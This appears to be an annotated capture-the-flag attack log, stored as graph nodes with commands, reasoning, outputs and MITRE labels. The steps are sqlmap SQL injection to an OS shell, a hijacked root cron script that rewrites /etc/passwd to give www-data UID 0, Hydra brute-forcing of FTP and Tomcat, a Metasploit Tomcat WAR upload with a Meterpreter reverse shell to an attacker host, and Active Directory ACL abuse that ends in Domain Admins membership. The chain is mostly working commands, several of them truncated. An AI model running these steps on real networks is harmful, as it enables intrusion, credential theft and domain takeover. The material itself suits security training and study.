nodes.label: ip addr
nodes.reasoning: Identify the active network interface on the compromised host (already inside via sqlmap os-shell). Need to know which interface to capture traffic on.
nodes.output: ens4 interface active with IP 10.123.82.197 and 10.0.2.197

actions_effects.action_description: Identify active network interfaces and their IP addresses on the compromised host.

nodes.label: tcpdump -i ens4 -w /tmp/traffic.pcap -c 2000
nodes.reasoning: Capture 2000 packets on the ens4 interface and write them to a pcap file in /tmp. Wait 2-3 minutes for HTTP traffic containing the flag to pass through.

actions_effects.action_description: Capture live network packets on the identified interface and write them to a pcap file.

nodes.label: echo 'password123' | su www-data -c 'strings /tmp/traffic.pc
nodes.reasoning: Switch to the www-data user (password set earlier via cron exploit) and extract printable strings from the pcap, filtering for the word 'flag'.
nodes.output: Flag string found in HTTP traffic

actions_effects.action_description: Extract printable strings from the captured pcap and filter for flag-related keywords.

nodes.label: strings /tmp/traffic.pcap | grep "14ce18"
nodes.reasoning: More targeted search — directly grep for the known flag ID in the extracted pcap strings.

actions_effects.action_description: Grep captured pcap strings directly for the known flag ID to confirm its presence.

nodes.label: tcpdump -r /tmp/traffic.pcap 'port 80' -A | strings | grep "
nodes.reasoning: Alternative approach: re-read the pcap file, filter to port 80 (HTTP) only, print ASCII content, and grep for the flag ID.
nodes.output: flag{14ce18...} confirmed in HTTP traffic on port 80

actions_effects.action_description: Re-read the pcap filtering to HTTP port 80 traffic and extract ASCII content to locate the flag.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: Use sqlmap's OS shell feature to gain interactive shell access to the web server as the database user (www-data).

actions_effects.action_description: Exploit a SQL injection vulnerability via sqlmap to obtain an interactive OS shell on the web server.

nodes.label: ls
nodes.reasoning: List files in the current working directory of the web shell to see what PHP files are present.

actions_effects.action_description: List files in the current working directory of the web shell to survey available PHP files.

nodes.label: pwd
nodes.reasoning: Confirm the current working directory of the web shell.

actions_effects.action_description: Confirm the current working directory of the web shell to establish filesystem context.

nodes.label: ls -la /var/www/html/
nodes.reasoning: Move up to the web root and list all files including hidden ones to find additional files.
nodes.output: Directories: php, html, images, upload. Also flag jpg visible in listing.

actions_effects.action_description: List all files including hidden ones in the web root directory to discover additional assets.

nodes.label: find /var/www -type f 2>/dev/null
nodes.reasoning: Recursively find all files under /var/www to get a complete picture of the web server's file system.

actions_effects.action_description: Recursively find all files under /var/www to get a complete map of the web server filesystem.

nodes.label: # Navigate to http://10.0.2.197 in browser
nodes.reasoning: Access the Cuiteur web application running on the target host.

actions_effects.action_description: Navigate to the target web application in a browser to observe its login and registration interface.

nodes.label: # Create account and navigate to suggestions.php
nodes.command: # Create account and navigate to suggestions.php
nodes.reasoning: Register a new user account to access authenticated pages, then go to the suggestions/comments page.

actions_effects.action_description: Register a new user account on the web application to gain access to authenticated pages.

nodes.label: # Inspect page source of suggestions.php (Ctrl+U / DevTools)
nodes.command: # Inspect page source of suggestions.php (Ctrl+U / DevTools)
nodes.reasoning: View the HTML source of the suggestions page to find hidden links or parameters not visible in the rendered page.
nodes.output: Found a link to recherche.php in the page source

actions_effects.action_description: View the HTML source of the suggestions page to discover hidden links not visible in the rendered output.

nodes.label: # Navigate to recherche.php and inspect its source
nodes.command: # Navigate to recherche.php and inspect its source
nodes.reasoning: Open the recherche.php page and inspect its source code to look for embedded flag values.
nodes.output: flag{521bce...} found embedded in the page source of recherche.php

actions_effects.action_description: Navigate to the discovered recherche.php page and inspect its source to extract an embedded flag.

nodes.label: Get-Module -ListAvailable
nodes.reasoning: Inside a PowerShell session (obtained via Metasploit meterpreter → shell → powershell). Check which PowerShell modules are available on the system.

actions_effects.action_description: List all available PowerShell modules on the compromised Windows host to assess enumeration capabilities.

nodes.label: Import-Module ActiveDirectory
nodes.reasoning: Load the Active Directory module to access AD enumeration cmdlets.

actions_effects.action_description: Import the Active Directory PowerShell module to enable AD enumeration cmdlets.

nodes.label: Get-ADForest
nodes.reasoning: Enumerate the Active Directory forest structure to understand the domain layout.

actions_effects.action_description: Enumerate the Active Directory forest structure to map the domain layout and root domain name.

nodes.label: Get-ADDomainController
nodes.reasoning: Discover domain controllers in the environment — their names, IPs, and FSMO roles.

actions_effects.action_description: Discover all domain controllers including their names, IP addresses, and FSMO role assignments.

nodes.label: Get-ADObject -Filter * -Properties * | Where-Object {$_.Desc
nodes.reasoning: Query ALL Active Directory objects with all their properties, then filter for any object whose Description attribute contains the flag ID. CTF flags are often hidden in AD object metadata.
nodes.output: AD object found with flag{59ecca...} in its Description field

actions_effects.action_description: Query all Active Directory objects and filter by Description attribute to find a flag hidden in AD metadata.

nodes.label: nmap 10.0.3.0/24
nodes.reasoning: Scan the entire 10.0.3.0/24 subnet to discover live hosts and open ports. Looking for a host with an HTTP service running the Tomcat manager.

actions_effects.action_description: Scan an entire /24 subnet with nmap to discover live hosts and their open ports.

nodes.label: hydra -L usernames.txt -P passwords.txt 10.0.3.197 -s 8282 h
nodes.reasoning: Brute-force the Tomcat manager login at http://10.0.3.197:8282/manager/html using a username and password list. -s 8282 specifies the non-standard port.

actions_effects.action_description: Brute-force HTTP basic authentication on the Tomcat manager endpoint using a username/password wordlist via Hydra.

nodes.label: # Navigate to http://10.0.3.197:8282 in browser and inspect
nodes.command: # Navigate to http://10.0.3.197:8282 in browser and inspect page sources
nodes.reasoning: Log into the Tomcat manager with found credentials (root:1234) and browse the application pages looking for the flag.
nodes.output: flag{90b353...} found embedded in an image src attribute on one of the pages

actions_effects.action_description: Log into the Tomcat manager with discovered credentials and manually browse application pages to locate an embedded flag.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: Use sqlmap's OS shell feature to get an interactive shell on the web server as www-data.

actions_effects.action_description: Exploit a SQL injection vulnerability via sqlmap's OS shell feature to obtain an interactive shell on the web server.

nodes.label: whoami
nodes.reasoning: Confirm the current user identity after gaining shell access.

actions_effects.action_description: Run whoami to confirm the current user identity after gaining shell access.

nodes.label: id
nodes.reasoning: Check the user ID and group memberships of the current user to understand privilege level.

actions_effects.action_description: Run id to enumerate the current user's UID, GID, and group memberships to assess privilege level.

nodes.label: ls -la /etc/cron.*
nodes.reasoning: List all cron job directories and their file permissions to find any cron scripts that www-data has write access to.
nodes.output: /etc/cron.hourly/cuiteur-cleaning owned by www-data with -rwxrwxrwx permissions — writable by current user and runs as root

actions_effects.action_description: List all cron job directories and their file permissions to identify writable cron scripts executable as root.

nodes.label: echo '#!/bin/bash' > /etc/cron.hourly/cuiteur-cleaning
nodes.reasoning: Overwrite the cron script with a new malicious script. Start with the bash shebang line. This script runs as root every hour.

actions_effects.action_description: Overwrite a world-writable root-owned cron script with a new malicious bash script starting with a shebang line.

nodes.label: sed -i 's#www-data:x:33:33:www-data:/var/www:/usr/sbin/nolog
nodes.reasoning: Append sed command to the cron script. When run as root, this replaces www-data's UID with 0 (root) in /etc/passwd, giving www-data root privileges.

actions_effects.action_description: Inject a sed command into the malicious cron script that rewrites the www-data /etc/passwd entry to UID 0 (root) when run as root.

nodes.label: echo "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
nodes.reasoning: Append the original www-data entry back to /etc/passwd so the system still recognises the original UID 33, giving www-data two entries — one as root (UID 0) and one as normal.
nodes.output: Original entry preserved alongside modified entry

actions_effects.action_description: Append the original www-data /etc/passwd entry back so both a UID-0 and original UID-33 entry coexist, completing the malicious cron script.

nodes.label: echo "www-data:password123" | chpasswd
nodes.reasoning: Set a known password (password123) for www-data so we can use su to switch to this user with root privileges after the cron job runs.

actions_effects.action_description: Set a known password for www-data via chpasswd so su can be used to switch to the account after it gains root privileges.

nodes.label: cat /etc/passwd
nodes.reasoning: Verify the /etc/passwd modification worked — should now show two www-data entries: one with UID 0 and one with UID 33.
nodes.output: Two www-data entries visible — one with uid=0 (root) and one with uid=33

actions_effects.action_description: Read /etc/passwd to confirm the dual www-data entries (UID 0 and UID 33) were written correctly by the cron job.

nodes.label: echo 'password123' | su www-data -c 'ls -la /root/'
nodes.reasoning: Wait for cron to run the script, then test root access by switching to www-data (now UID 0) and listing /root/ which is only accessible to root.

actions_effects.action_description: Use su to switch to the now-UID-0 www-data account and access the /root directory to retrieve the flag.

nodes.label: cat /etc/crontab
nodes.reasoning: Check the main crontab to confirm when cron.hourly jobs run (needed to know how long to wait).
nodes.output: 17 * * * * root cd / && run-parts --report /etc/cron.hourly — runs at minute 17 of every hour

actions_effects.action_description: Read /etc/crontab to determine the exact schedule at which cron.hourly jobs execute.

nodes.label: nmap -p 21 10.0.3.0/24
nodes.reasoning: Scan the subnet specifically for port 21 (FTP) to find which host has an FTP server running.

actions_effects.action_description: Scan a /24 subnet on port 21 to identify which host is running an FTP server.

nodes.label: hydra -L usernames.txt -p passwords.txt ftp://10.0.3.197 -t
nodes.reasoning: Brute-force the FTP login using a username list and password list against the discovered FTP server.

actions_effects.action_description: Brute-force FTP credentials against the discovered host using a username and password list via Hydra.

nodes.label: ftp 10.0.3.197
nodes.reasoning: Connect to the FTP server using the discovered credentials (admin:1111) to browse its contents and retrieve the flag.
nodes.output: Logged in as admin. Flag file found and downloaded.

actions_effects.action_description: Connect to the FTP server with discovered credentials to browse its contents and retrieve the flag file.

nodes.label: msfconsole
nodes.reasoning: Launch the Metasploit Framework console to exploit the Tomcat manager. Credentials (root:1234) were already obtained from the flag90b353 hydra brute-force.

actions_effects.action_description: Start the Metasploit Framework console in preparation for exploiting the Tomcat manager with previously obtained credentials.

nodes.label: use exploit/multi/http/tomcat_mgr_upload
nodes.reasoning: Select the Tomcat Manager WAR upload exploit, which uses authenticated access to the Tomcat manager to deploy a malicious WAR file and get a shell.

actions_effects.action_description: Load the Metasploit tomcat_mgr_upload exploit module that deploys a malicious WAR file via authenticated manager access.

nodes.label:
set RHOSTS 10.0.3.197
set RPORT 8282
set HttpUsername root
s
nodes.command:
set RHOSTS 10.0.3.197
set RPORT 8282
set HttpUsername root
set HttpPassword 1234
set LHOST 192.168.0.8
set payload java/meterpreter/reverse_tcp
exploit
nodes.reasoning: Configure the exploit with target host, port, Tomcat credentials, and local host for the reverse shell. Then run the exploit.

raw.cleaned_command:
set RHOSTS 10.0.3.197
set RPORT 8282
set HttpUsername root
set HttpPassword 1234
set LHOST 192.168.0.8
set payload java/meterpreter/reverse_tcp
exploit

actions_effects.action_description: Configure the Tomcat WAR upload exploit with target host, port, and stolen credentials, then execute it to open a Meterpreter session.

nodes.label: shell
nodes.reasoning: Drop from meterpreter into a native OS shell to run Windows commands directly.
nodes.output: Windows command shell obtained on Tomcat server

actions_effects.action_description: Drop from the Meterpreter session into a native OS command shell to run system commands directly on the Tomcat server.

nodes.label: dir /s /b C:\ | findstr /i "cd699a"
nodes.reasoning: Recursively list all files on the C: drive in bare format and filter for the flag ID. Used because flag files have the flag hash in their filename.

actions_effects.action_description: Recursively search the entire C: drive for a file matching the flag hash in its name.

nodes.label: download "C:\\ProgramData\\Tomcat9\\flag{cd699a5719c85f42937
nodes.reasoning: Use meterpreter's download command to transfer the flag file from the Windows server to the local Kali machine.

actions_effects.action_description: Download the located flag file from the compromised Windows host to the attacker machine via Meterpreter.

nodes.label: type "C:\ProgramData\Tomcat9\conf\tomcat-users.xml"
nodes.reasoning: Read the Tomcat users config file to discover valid credentials. Running inside a Windows shell obtained via Metasploit.

actions_effects.action_description: Read the Tomcat users configuration file to extract plaintext credentials stored on the server.

nodes.label:
Import-Module ActiveDirectory
Get-ADGroup "HelpDesk"
nodes.reasoning: Switch to PowerShell. Load the Active Directory module and look up the HelpDesk group to get its LDAP distinguished name and SID for later manipulation.

actions_effects.action_description: Load the Active Directory PowerShell module and query the HelpDesk group to obtain its distinguished name and SID.

nodes.label: $group = [ADSI]"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=i
nodes.reasoning: Take ownership of the HelpDesk AD group using the tomcat.svc account (the account we're running as via the Tomcat exploit). This gives us control over group membership.
nodes.output: tomcat.svc is now the owner of HelpDesk group

mitre.technique_name: File and Directory Permissions Modification: Windows File and Directory Permissions Modification

actions_effects.action_description: Use ADSI to transfer ownership of the HelpDesk Active Directory group to the tomcat.svc service account.

nodes.label:
$acl = $group.psbase.ObjectSecurity
$rule = New-Object Syste
nodes.reasoning: Grant GenericAll rights on the HelpDesk group to tomcat.svc. GenericAll means full control — allows reading, writing, and managing group membership.
nodes.output: GenericAll permission granted on HelpDesk group

actions_effects.action_description: Grant GenericAll (full control) rights on the HelpDesk AD group to the tomcat.svc account via an ADSI access rule.

nodes.label: $helpdesk = [ADSI]"LDAP://CN=HelpDesk,CN=Users,DC=internal,D
nodes.reasoning: Add crash_override (a user whose password we know: nebbie) to the HelpDesk group, setting up for lateral movement via RDP.

mitre.technique_name: Account Manipulation: Additional Local or Domain Group Membership

actions_effects.action_description: Add the crash_override user (whose password is known) to the HelpDesk AD group to enable RDP access.

nodes.label: xfreerdp3 /u:crash_override /p:nebbie /v:10.0.3.197 /cert:ig
nodes.reasoning: Connect to the target via RDP using crash_override's credentials. The HelpDesk group membership should allow RDP access.
nodes.output: RDP session established to 10.0.3.197 as crash_override

actions_effects.action_description: Open an RDP session to the target host using the crash_override credentials enabled by HelpDesk group membership.

nodes.label: $daGroup = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=intern
nodes.reasoning: Add crash_override to Domain Admins. Log out and back in via RDP to refresh group membership tokens.

mitre.technique_name: Account Manipulation: Additional Local or Domain Group Membership

actions_effects.action_description: Add the crash_override user to the Domain Admins group via ADSI, achieving full domain compromise.

nodes.label: # Log out and reconnect via RDP, then browse to Domain Admin
nodes.command: # Log out and reconnect via RDP, then browse to Domain Admin user folder
nodes.reasoning: After rejoining RDP, the new Domain Admin token is active. Navigate to the administrator's desktop or user folders to find the flag.
nodes.output: flag{cfcec8...} found in the Domain Admin user directory

actions_effects.action_description: Prose note describing the manual step of logging out and reconnecting via RDP to activate the new Domain Admin token.

nodes.label: ' (in search input of recherche_old.php)
nodes.reasoning: Test if the search field is injectable by entering a single quote. If the page throws a database error, the parameter is vulnerable.
nodes.output: Page shows database error — confirms SQL injection vulnerability

actions_effects.action_description: Inject a single quote into the search field of a legacy PHP page to confirm the parameter is vulnerable to SQL injection.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: Use sqlmap to enumerate all databases on the server. -p specifies the injectable parameter, --dbs lists all databases.
nodes.output: Found databases including: cuiteur, mysql, information_schema

actions_effects.action_description: Use sqlmap to automatically exploit the confirmed injection point and enumerate all database names on the server.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: List all tables inside the cuiteur database to understand its structure.

actions_effects.action_description: Use sqlmap to list all tables within the target cuiteur database to map its schema.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: Dump all data from the cuiteur database to local drive at ~/.local/share/sqlmap/output.

actions_effects.action_description: Use sqlmap to dump the full contents of the cuiteur database, recovering application data including the flag.

nodes.label: sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="
nodes.reasoning: Also dump the mysql.user table to obtain database credentials stored on the server.

actions_effects.action_description: Use sqlmap to dump the mysql.user system table and extract database-level credentials stored on the server.

mitre_nodes.label: T1098.007
mitre_nodes.technique_name: Account Manipulation: Additional Local or Domain Group Membership
